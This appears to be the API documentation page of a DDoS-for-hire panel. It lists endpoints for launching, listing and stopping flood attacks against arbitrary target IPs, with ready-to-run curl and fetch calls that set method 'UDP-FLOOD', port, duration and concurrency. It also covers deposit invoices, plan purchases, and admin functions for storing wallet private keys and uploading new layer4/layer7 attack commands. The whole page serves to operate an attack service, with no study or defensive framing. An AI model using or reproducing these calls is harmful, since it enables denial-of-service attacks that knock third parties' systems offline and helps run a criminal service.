API Docs

API Documentation

All backend endpoints exposed by this server (from main.go).

Auth: Panel endpoints use session cookie sess. Public API uses Authorization: Bearer <token> (or ?token= for legacy).
Note: Some admin endpoints require being logged in as admin.
GET

/api/user/info

Public Token API

Get user info by API token.

curl -H "Authorization: Bearer <TOKEN>" https://YOUR_HOST/api/user/info
Legacy: /api/user/info?token=<TOKEN>
POST

/api/launch

Public Token API

Launch an attack via API token (simplified endpoint).

curl -X POST -H "Authorization: Bearer <TOKEN>" -d "target=1.1.1.1" "https://YOUR_HOST/api/launch"
Parameters: target (required). Authorization must be in the header.
POST

/api/attack

Launch attack from panel (requires session cookie).

fetch('/api/attack',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-Token':'<CSRF>'},body:JSON.stringify({target:'1.1.1.1',port:'80',time:'60',method:'UDP-FLOOD',concurrency:'1'})})
GET

/api/attack/list

List your active attacks (session required). Returns JSON array.

fetch('/api/attack/list').then(r=>r.json())
POST

/api/attack/stop

Stop an attack by ID (session required).

fetch('/api/attack/stop',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','X-CSRF-Token':'<CSRF>'},body:'id=<ATTACK_ID>'}).then(r=>r.json())
POST

/api/attack/stopAll

Stop all your sessions (session required). Admins trigger a global stop.

fetch('/api/attack/stopAll',{method:'POST',headers:{'X-CSRF-Token':'<CSRF>'}}).then(r=>r.json())
POST

/api/deposit/create

Create a deposit invoice (session + CSRF required). Redirects to /invoice?id=....

POST form: amount=<USD> + csrf_token
GET

/api/deposit/check

Check deposit status by invoice id.

fetch('/api/deposit/check?id=<INVOICE_ID>').then(r=>r.json())
POST

/api/market/purchase

Purchase product/plan (session + CSRF required). Redirects to dashboard.

POST form: id=<PRODUCT_ID> + csrf_token
GET

/api/captcha/new

Get a new captcha id (used on register page).

fetch('/api/captcha/new').then(r=>r.text())
POST

/api/ticket/create

Create a ticket (session + CSRF required). Redirects to support page.

POST form: subject=<...> category=<...> message=<...> + csrf_token
POST

/api/ticket/reply

Reply to a ticket (session + CSRF required). Redirects to support/admin view.

POST form: id=<TICKET_ID> message=<...> + csrf_token

Admin Endpoints

Require session as admin. Most endpoints redirect back to admin panel.

/api/admin/gen-codePOST form: plan (CSRF required)
/api/admin/config-plansPOST form: name, concurrents, time, vip, api (CSRF required)
/api/admin/add-productPOST form: name, price, time, concurrents, vip, api (CSRF required)
/api/admin/del-productPOST form: id (CSRF required)
/api/admin/add-walletPOST form: address, private_key (CSRF required)
/api/admin/del-walletPOST form: address (CSRF required)
/api/admin/blacklistPOST form: action=add|del, target, reason (CSRF required)
/api/admin/upload-methodPOST form: name, type(layer4/layer7), command (CSRF required)
/api/admin/deposit/actionPOST form: id, action=confirm|cancel (CSRF required)
POST
